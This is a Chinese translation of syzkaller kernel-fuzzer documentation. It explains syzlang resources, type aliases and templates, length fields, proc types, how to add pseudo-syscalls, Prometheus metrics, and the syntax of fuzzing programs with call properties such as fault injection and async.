<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">resource fd[int32]: <span class="number">0xffffffffffffffff</span>, AT_FDCWD, <span class="number">1000000</span></span><br><span class="line">resource sock[fd]</span><br><span class="line">resource sock_unix[sock]</span><br><span class="line"></span><br><span class="line">socket(...) sock</span><br><span class="line"><span class="title function_">accept</span><span class="params">(fd sock, ...)</span> sock</span><br><span class="line"><span class="title function_">listen</span><span class="params">(fd sock, backlog int32)</span></span><br></pre></td></tr></table></figure>

<p>资源不一定要由系统调用返回。它们可以像其他任何数据类型一样被使用。比如说：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">resource my_resource[int32]</span><br><span class="line"></span><br><span class="line">request_producer(..., arg ptr[out, my_resource])</span><br><span class="line">request_consumer(..., arg ptr[inout, test_struct])</span><br><span class="line"></span><br><span class="line">test_struct &#123;</span><br><span class="line">	...</span><br><span class="line">	attr	my_resource</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于更复杂的生产者&#x2F;消费者的情况，可以利用字段属性。比如说：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">resource my_resource_1[int32]</span><br><span class="line">resource my_resource_2[int32]</span><br><span class="line"></span><br><span class="line">request_produce1_consume2(..., arg ptr[inout, test_struct])</span><br><span class="line"></span><br><span class="line">test_struct &#123;</span><br><span class="line">	...</span><br><span class="line">	field0	<span class="title function_">my_resource_1</span>	<span class="params">(out)</span></span><br><span class="line">	field1	<span class="title function_">my_resource_2</span>	<span class="params">(in)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>每种资源类型必须被至少一个系统调用 “生产”（作为输出）（在联合和可选指针之外）和被至少一个系统调用 “消费”（作为输入）。</p>
<h2 id="类型别名"><a href="#类型别名" class="headerlink" title="类型别名"></a>类型别名</h2><p>使用以下语法为经常重复的复杂类型赋予短类型别名：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type identifier underlying_type</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type signalno int32[<span class="number">0</span>:<span class="number">65</span>]</span><br><span class="line">type net_port proc[<span class="number">20000</span>, <span class="number">4</span>, int16be]</span><br></pre></td></tr></table></figure>

<p>然后，在任何情况下都可以使用类型别名来代替基础类型。底层类型需要像描述一个结构字段一样描述，也就是说，如果需要的话，可以使用底层类型。但是，类型别名也可以用作系统调用参数。底层类型目前仅限于整数类型<code>const</code>、 <code>proc</code>、<code>flags</code>、<code>ptr</code>和<code>ptr64</code>类型。</p>
<p>有一些内置类型别名：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type bool8	int8[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">type bool16	int16[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">type bool32	int32[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">type bool64	int64[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">type boolptr	intptr[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">type fileoff[BASE] BASE</span><br><span class="line"></span><br><span class="line">type filename <span class="built_in">string</span>[filename]</span><br><span class="line"></span><br><span class="line">type buffer[DIR] ptr[DIR, <span class="built_in">array</span>[int8]]</span><br></pre></td></tr></table></figure>

<h2 id="类型模板"><a href="#类型模板" class="headerlink" title="类型模板"></a>类型模板</h2><p>类型模板可以声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">type buffer[DIR] ptr[DIR, <span class="built_in">array</span>[int8]]</span><br><span class="line">type fileoff[BASE] BASE</span><br><span class="line">type nlattr[TYPE, PAYLOAD] &#123;</span><br><span class="line">	nla_len		len[parent, int16]</span><br><span class="line">	nla_type	<span class="type">const</span>[TYPE, int16]</span><br><span class="line">	payload		PAYLOAD</span><br><span class="line">&#125; [align_4]</span><br></pre></td></tr></table></figure>

<p>后来使用如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscall(a buffer[in], b fileoff[int64], c ptr[in, nlattr[FOO, int32]])</span><br></pre></td></tr></table></figure>

<p>内置类型模板<code>optional</code>定义为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">type optional[T] [</span><br><span class="line">	val	T</span><br><span class="line">	<span class="type">void</span>	<span class="type">void</span></span><br><span class="line">] [varlen]</span><br></pre></td></tr></table></figure>

<h2 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h2><p>你可以通过使用<code>len</code>、<code>bytesize</code>和<code>bitsize</code>等类型来指定结构中的特定字段或命名参数的长度，例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">write(fd fd, buf ptr[in, <span class="built_in">array</span>[int8]], count len[buf])</span><br><span class="line"></span><br><span class="line">sock_fprog &#123;</span><br><span class="line">	len	len[filter, int16]</span><br><span class="line">	filter	ptr[in, <span class="built_in">array</span>[sock_filter]]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>len</code>的参数是指针，则使用指针参数的长度。</p>
<p>用<code>bytesizeN</code>来表示一个字段的长度，N的可能值是1、2、4和8。</p>
<p>要表示父结构的长度，可以使用<code>len[parent, int8]</code>。当结构被嵌入到另一个结构中时，为了表示上一级父结构的长度，可以指定特定父结构的类型名称：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s1 &#123;</span><br><span class="line">    f0      len[s2]  <span class="meta"># length of s2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s2 &#123;</span><br><span class="line">    f0      s1</span><br><span class="line">    f1      <span class="built_in">array</span>[int32]</span><br><span class="line">    f2      len[parent, int32]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>len</code>参数也可以是一个路径表达式，允许更复杂的寻址。路径表达式类似于C语言的字段引用，但也允许引用父级和同级元素。在路径的开头使用一个特殊的引用系统调用，允许直接引用系统调用的参数。例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">s1 &#123;</span><br><span class="line">	a	ptr[in, s2]</span><br><span class="line">	b	ptr[in, s3]</span><br><span class="line">	c	<span class="built_in">array</span>[int8]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s2 &#123;</span><br><span class="line">	d	<span class="built_in">array</span>[int8]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s3 &#123;</span><br><span class="line"># This refers to the <span class="built_in">array</span> c in the parent s1.</span><br><span class="line">	e	len[s1:c, int32]</span><br><span class="line"># This refers to the <span class="built_in">array</span> d in the sibling s2.</span><br><span class="line">	f	len[s1:a:d, int32]</span><br><span class="line"># This refers to the <span class="built_in">array</span> k in the child s4.</span><br><span class="line">	g	len[i:j, int32]</span><br><span class="line"># This refers to syscall argument l.</span><br><span class="line">	h	len[syscall:l, int32]</span><br><span class="line">	i	ptr[in, s4]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s4 &#123;</span><br><span class="line">	j	<span class="built_in">array</span>[int8]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(k ptr[in, s1], l ptr[in, <span class="built_in">array</span>[int8]])</span><br></pre></td></tr></table></figure>

<h2 id="Proc"><a href="#Proc" class="headerlink" title="Proc"></a>Proc</h2><p><code>proc</code>类型可以用来表示每个进程的整数。我们的想法是为每个执行者提供一个单独的数值范围，这样他们就不会相互干扰。</p>
<p>最简单的例子是一个端口号。<code>proc[20000, 4, int16be]</code>类型意味着我们要从<code>20000</code>开始生成一个<code>int16be</code>整数，并为每个进程分配4个值。因此，执行者编号n将得到<code>[20000 + n * 4, 20000 + (n + 1) * 4]</code>范围内的值。</p>
<h2 id="整数常量"><a href="#整数常量" class="headerlink" title="整数常量"></a>整数常量</h2><p>整数常量可以指定为十进制常量、<code>0x</code>前缀十六进制常量、<code>&#39;</code>字符常量或从内核头文件中提取或由<code>define</code>指令定义的符号常量。例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">foo(a <span class="type">const</span>[<span class="number">10</span>], b <span class="type">const</span>[<span class="number">-10</span>])</span><br><span class="line">foo(a <span class="type">const</span>[<span class="number">0xabcd</span>])</span><br><span class="line">foo(a int8[<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;z&#x27;</span>])</span><br><span class="line">foo(a <span class="type">const</span>[PATH_MAX])</span><br><span class="line">foo(a ptr[in, <span class="built_in">array</span>[int8, MY_PATH_MAX]])</span><br><span class="line">define MY_PATH_MAX	PATH_MAX + <span class="number">2</span></span><br></pre></td></tr></table></figure>

<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>描述文件还包含<code>include</code>引用 Linux 内核头文件的 <code>incdir</code>指令、引用自定义 <code>Linux</code> 内核头目录的<code>define</code>指令和定义符号常量值的指令。</p>
<p>syzkaller 执行器定义了一些<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/pseudo_syscalls.md">伪系统调用</a> ，可以用作描述文件中的任何其他系统调用。这些伪系统调用扩展为文字 C 代码，并且可以执行用户定义的自定义操作。<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/executor/common_linux.h">可以在executor&#x2F;common_linux.h</a>中找到一些示例 。关于如何写好一个描述文件可以参考<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions.md#tips">这里</a>。</p>
<h1 id="伪系统调用"><a href="#伪系统调用" class="headerlink" title="伪系统调用"></a>伪系统调用</h1><p>除了常规系统调用，<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions.md">系统调用描述</a>文件还可以包含伪系统调用。这些是在执行程序中定义的 C 函数。当测试程序使用伪系统调用时，执行器将在生成的 C 程序中生成伪系统调用函数代码。</p>
<p>这允许测试程序具有特定的代码块来执行某些操作，它们也可以用作原始系统调用的更易于测试的包装器。</p>
<p><strong>通常不鼓励</strong>使用伪系统调用，因为它们破坏了声明性描述的所有优点（声明性、简洁性、对所有方面的模糊控制、对逻辑进行全局改进的可能性、静态检查、更少的错误等），增加了维护负担，是不可重复使用并使 C 复制器更长。但是，syzlang 的表达能力不足以涵盖所有可能的情况，因此需要根据具体情况考虑使用伪系统调用（额外的好处、代码量、扩展 syzlang 以涵盖这种情况的可能性等） 。</p>
<h2 id="如何向执行程序添加伪系统调用"><a href="#如何向执行程序添加伪系统调用" class="headerlink" title="如何向执行程序添加伪系统调用"></a>如何向执行程序添加伪系统调用</h2><p>首先，考虑伪系统调用的范围以及它将与哪些系统和子系统相关。执行器包括一组固定的 C 头文件，其中包含伪系统调用的代码。在创建新文件之前检查新文件是否适合现有文件之一。这些头文件在<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/pkg/csource/gen.go">gen.go</a>中定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">executorFilenames := []<span class="built_in">string</span>&#123;</span><br><span class="line">        <span class="string">&quot;common_linux.h&quot;</span>,</span><br><span class="line">        <span class="string">&quot;common_akaros.h&quot;</span>,</span><br><span class="line">        <span class="string">&quot;common_bsd.h&quot;</span>,</span><br><span class="line">        <span class="string">&quot;common_fuchsia.h&quot;</span>,</span><br><span class="line">        <span class="string">&quot;common_windows.h&quot;</span>,</span><br><span class="line">        <span class="string">&quot;common_test.h&quot;</span>,</span><br><span class="line">        <span class="string">&quot;common_kvm_amd64.h&quot;</span>,</span><br><span class="line">        <span class="string">&quot;common_kvm_arm64.h&quot;</span>,</span><br><span class="line">        <span class="string">&quot;common_usb_linux.h&quot;</span>,</span><br><span class="line">        <span class="string">&quot;common_usb_netbsd.h&quot;</span>,</span><br><span class="line">        <span class="string">&quot;common_usb.h&quot;</span>,</span><br><span class="line">        <span class="string">&quot;android/android_seccomp.h&quot;</span>,</span><br><span class="line">        <span class="string">&quot;kvm.h&quot;</span>,</span><br><span class="line">        <span class="string">&quot;kvm_amd64.S.h&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例如，如果我们的新伪系统调用是特定于 Linux 的，那么 <a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/executor/common_linux.h">common_linux.h</a>将是放置它的地方。</p>
<p>实际的伪系统调用函数可能如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> SYZ_EXECUTOR || __NR_syz_mycall</span></span><br><span class="line"><span class="comment">/* Add all the necessary #include and #define headers */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">syz_mycall</span><span class="params">(<span class="keyword">volatile</span> <span class="type">long</span> a0, <span class="keyword">volatile</span> <span class="type">long</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">/* Function body */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>确保所有的函数要求都满足，并且可以编译。注意，函数名必须以 “syz_”开头。它也可以接受不同数量的参数。参数类型必须是<code>volatile long</code>，返回类型–<code>long</code>。<code>long</code>是必须的，以避免潜在的调用约定问题，因为它被投到了一个接受<code>long</code>的函数指针上。<code>volatile</code>的原因很有趣：很多<code>libc</code>函数都有各种参数约束的注释（例如，这个参数不应该是<code>NULL</code>，或者这个参数必须是有效的文件描述符）；C重现者可能会用常量参数调用这些函数，编译器可能会发现其中一些约束被违反了（例如，把<code>NULL</code>传给非<code>NULL</code>参数，或者把<code>-1</code>传成文件描述符），从而产生错误&#x2F;警告。<code> volatile</code>可以防止这种情况。</p>
<p>现在，为了正确处理伪系统调用，我们必须更新<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/pkg/host/syscalls_linux.go"><code>syscalls_linux.go</code></a>中的<code>isSupportedSyzkall</code>，并为这个系统调用添加一个特殊情况，在必要时启用它。如果我们想无条件地启用它，我们可以简单地让<code>isSupportedSyzkall</code>返回<code>true,&quot;&quot;</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">func <span class="title function_">isSupportedSyzkall</span><span class="params">(sandbox <span class="built_in">string</span>, c *prog.Syscall)</span> <span class="params">(<span class="type">bool</span>, <span class="built_in">string</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> c.CallName &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;syz_mycall&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>, <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>最后，运行<code>make generate</code>。现在您可以在系统调用描述文件中使用它，就像它是常规系统调用一样：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syz_mycall(arg0 pid, arg1 <span class="type">const</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<h2 id="外部依赖"><a href="#外部依赖" class="headerlink" title="外部依赖"></a>外部依赖</h2><p>实现不得使用任何外部库或外部头文件，除了最基本和标准的（如<code>&lt;unistd.h&gt;</code>和 <code>&lt;sys/mman.h&gt;</code>）。特别是，它不能依赖于附加软件包安装的库&#x2F;头文件，也不能依赖于最近添加的内核子系统的头文件。外部依赖已被证明是脆弱的并且很容易导致构建损坏，因为在 fuzzer 和任何 C 复制器上的任何构建&#x2F;运行都需要所有依赖。例如，某些发行版上可能缺少包&#x2F;头文件、名称不同、版本错误、损坏或与其他头文件冲突。不幸的是，没有办法可靠地为 C 程序指定此类依赖项和要求。因此，如果伪系统调用需要定义某些结构、常量或辅助函数，则应在执行程序代码本身中尽可能少地描述这些内容（它们将成为 C 复制器的一部分）。</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>每个新的伪系统调用应该在·sys&#x2F;OS&#x2F;test·中至少有一个测试。参见<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/sys/linux/test">Linux</a>测试的例子。一个测试只是一个带有检查系统调用返回值的程序。至少应该有一个测试，包含使用伪系统调用的 “主要成功场景”。请看<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/sys/linux/test/io_uring"><code>io_uring</code></a>测试作为一个很好的例子。这样的测试很重要，因为它们可以确保伪系统调用代码不包含 “愚蠢 “的bug（例如，每次在<code>NULL-deref</code>时崩溃），确保fuzzer有可能想出成功的场景（作为伪系统调用和周围描述的组合），并确保它在未来继续工作。关于测试的细节，请参见<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions.md#testing">描述的测试</a>。</p>
<h1 id="普罗米修斯指标"><a href="#普罗米修斯指标" class="headerlink" title="普罗米修斯指标"></a>普罗米修斯指标</h1><p><code>syz-manager</code>的指标在<code>http</code>端点的<code>URI /metrics</code>上公开。目前从管理器导出的普罗米修斯指标是<code>syz_exec_total</code>、<code>syz_corpus_cover</code>和<code>syz_crash_total</code>。</p>
<p>这些指标可以通过以下的普罗米修斯客户端配置来摄取：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">scrape_configs:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">job_name:</span> <span class="string">syzkaller</span></span><br><span class="line">  <span class="attr">scrape_interval:</span> <span class="string">10s</span></span><br><span class="line">  <span class="attr">static_configs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">targets:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">localhost:56741</span></span><br></pre></td></tr></table></figure>

<p>在<code>syz-manager</code>重启时，这些值被重置为零，只反映在当前执行的<code>syz-manager</code>中。</p>
<h1 id="程序语法"><a href="#程序语法" class="headerlink" title="程序语法"></a>程序语法</h1><p>Syzkaller使用一种紧凑的特定领域语言（DSL）来记录已执行的程序，测试其代码，并在语料库中持久保存程序。本页提供了相应语法的简要描述。一些有用的信息也可以在现有的<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/sys/linux/test">例子</a>和程序<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/prog/encoding.go">反序列化代码</a>中找到。</p>
<p>与执行选项一起，DSL提供了syz-executor运行程序所需的一切。例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r0 = syz_open_dev$loop(&amp;(<span class="number">0x7f00000011c0</span>), <span class="number">0x0</span>, <span class="number">0x0</span>)</span><br><span class="line">r1 = openat$<span class="number">6l</span>owpan_control(<span class="number">0xffffffffffffff9c</span>, &amp;(<span class="number">0x7f00000000c0</span>), <span class="number">0x2</span>, <span class="number">0x0</span>)</span><br><span class="line">ioctl$LOOP_SET_FD(r0, <span class="number">0x4c00</span>, r1)</span><br></pre></td></tr></table></figure>

<p>这个程序中的每一行都描述了一个特定的系统调用，前两次调用将结果保存在临时变量r0和r1中，这些变量被传递给第三个函数调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">line = assignment | call</span><br><span class="line">assignment = variable <span class="string">&quot; = &quot;</span> call</span><br><span class="line">call = syscall-name <span class="string">&quot;(&quot;</span> [arg [<span class="string">&quot;,&quot;</span> arg]*] <span class="string">&quot;)&quot;</span>  [<span class="string">&quot;(&quot;</span> [call-prop [<span class="string">&quot;,&quot;</span> call-prop*] <span class="string">&quot;)&quot;</span>]</span><br><span class="line">arg = <span class="string">&quot;nil&quot;</span> | <span class="string">&quot;AUTO&quot;</span> | <span class="type">const</span>-arg | resource-arg | result-arg | pointer-arg | <span class="built_in">string</span>-arg | <span class="keyword">struct</span>-arg | <span class="built_in">array</span>-arg | <span class="keyword">union</span>-arg</span><br><span class="line"><span class="type">const</span>-arg = <span class="string">&quot;0x&quot;</span> hex-integer</span><br><span class="line">resource-arg = variable [<span class="string">&quot;/&quot;</span> hex-integer] [<span class="string">&quot;+&quot;</span> hex-integer]</span><br><span class="line">result-arg = <span class="string">&quot;&lt;&quot;</span> variable <span class="string">&quot;=&gt;&quot;</span> arg</span><br><span class="line">pointer-arg = <span class="string">&quot;&amp;&quot;</span> pointer-arg-addr [<span class="string">&quot;=ANY&quot;</span>] <span class="string">&quot;=&quot;</span> arg</span><br><span class="line">pointer-arg-addr = <span class="string">&quot;AUTO&quot;</span> | <span class="string">&quot;(&quot;</span> pointer-addr [<span class="string">&quot;/&quot;</span> region-size] <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="built_in">string</span>-arg = <span class="string">&quot;&#x27;&quot;</span> escaped-<span class="built_in">string</span> <span class="string">&quot;&#x27;&quot;</span> | <span class="string">&quot;\&quot;&quot;</span> escaped-<span class="built_in">string</span> <span class="string">&quot;\&quot;&quot;</span></span><br><span class="line"><span class="keyword">struct</span>-arg =  <span class="string">&quot;&#123;&quot;</span> [arg [<span class="string">&quot;,&quot;</span> arg]*] <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">array</span>-arg = <span class="string">&quot;[&quot;</span> [arg [<span class="string">&quot;,&quot;</span> arg]*] <span class="string">&quot;]&quot;</span></span><br><span class="line"><span class="keyword">union</span>-arg = <span class="string">&quot;@&quot;</span> field-name [<span class="string">&quot;=&quot;</span> arg]</span><br><span class="line">call-prop = prop-name <span class="string">&quot;: &quot;</span> prop-value</span><br><span class="line">variable = <span class="string">&quot;r&quot;</span> dec-integer</span><br><span class="line">pointer-addr = hex-integer</span><br><span class="line">region-size = hex-integer</span><br></pre></td></tr></table></figure>

<p>也可以添加注释：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Obtain a file handle</span><br><span class="line">r0 = openat(<span class="number">0xffffffffffffff9c</span>, &amp;AUTO=<span class="string">&#x27;./file1\x00&#x27;</span>, <span class="number">0x42</span>, <span class="number">0x1ff</span>)</span><br><span class="line"></span><br><span class="line"># Perform a write operation</span><br><span class="line">write(r0, &amp;AUTO=<span class="string">&quot;01010101&quot;</span>, <span class="number">0x4</span>)</span><br></pre></td></tr></table></figure>

<h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p>内存管理是由syzkaller本身执行的。它将分配必要大小的虚拟内存区域并设置指针参数的最终值。</p>
<p>通过使用AUTO关键字，程序可以让syzkaller完全控制数据的存储。这可能很方便，例如，当一个参数必须通过引用传递，但其值的确切位置并不特别重要。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r1 = syz_genetlink_get_family_id$nl80211(&amp;AUTO=<span class="string">&#x27;nl80211\x00&#x27;</span>, <span class="number">0xffffffffffffffff</span>)</span><br><span class="line">ioctl$sock_SIOCGIFINDEX_80211(r0, <span class="number">0x8933</span>, &amp;AUTO=&#123;<span class="string">&#x27;wlan0\x00&#x27;</span>, &lt;r2=&gt;<span class="number">0x0</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>另外，一些数据可以被 “锚定 “在特定的地址上。当一个内存区域必须在多个调用之间共享时，这可能特别重要。在这种情况下，指针地址必须在<code>0x7f0000000000</code>偏移处给出。在实际执行之前，syzkaller会将指针调整到实际<code>mmaped</code>区域的起点。</p>
<h2 id="调用属性"><a href="#调用属性" class="headerlink" title="调用属性"></a>调用属性</h2><p>调用属性指定了关于必须如何执行一个特定调用的额外信息。一个程序中的每个调用都有自己的调用属性。如果没有提供属性，syzkaller会采用默认的属性。</p>
<p>目前，syzkaller支持以下调用属性。</p>
<h3 id="故障注入"><a href="#故障注入" class="headerlink" title="故障注入"></a>故障注入</h3><p>语法： <code>fail_nth: N</code>。</p>
<p>它需要一个整数的参数N，如果该参数为非负数，则将在第N个场合注入一个故障。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r0 = openat$<span class="number">6l</span>owpan_control(<span class="number">0xffffffffffffff9c</span>, &amp;(<span class="number">0x7f00000000c0</span>), <span class="number">0x2</span>, <span class="number">0x0</span>)</span><br><span class="line">ioctl$LOOP_SET_FD(r0, <span class="number">0x4c00</span>, r0) (fail_nth: <span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Async"><a href="#Async" class="headerlink" title="Async"></a>Async</h3><p>语法： <code>async</code>。</p>
<p>指示syz-executor不要等到调用完成，立即进行下一个调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r0 = openat(<span class="number">0xffffffffffffff9c</span>, &amp;AUTO=<span class="string">&#x27;./file1\x00&#x27;</span>, <span class="number">0x42</span>, <span class="number">0x1ff</span>)</span><br><span class="line">write(r0, &amp;AUTO=<span class="string">&quot;01010101&quot;</span>, <span class="number">0x4</span>) (async)</span><br><span class="line">read(r0, &amp;AUTO=<span class="string">&quot;&quot;</span>/<span class="number">4</span>, <span class="number">0x4</span>)</span><br><span class="line">close(r0)</span><br></pre></td></tr></table></figure>

<p>在设置 <code>async</code> 标志的时候要注意以下几点：</p>
<ul>
<li>这样的程序只能在线程模式下执行（即syz-executor必须设置<code>-threaded</code>标志）。</li>
<li>每个<code>async</code>调用都在一个单独的线程中执行，而且可用的线程数量有限（<code>kMaxThreads = 16</code>）。</li>
<li>如果一个<code>async</code>调用产生了一个资源，其他的调用可能会把它作为输入，如果产生资源的调用到那时还没有完成，syz-executor将直接传0。</li>
</ul>
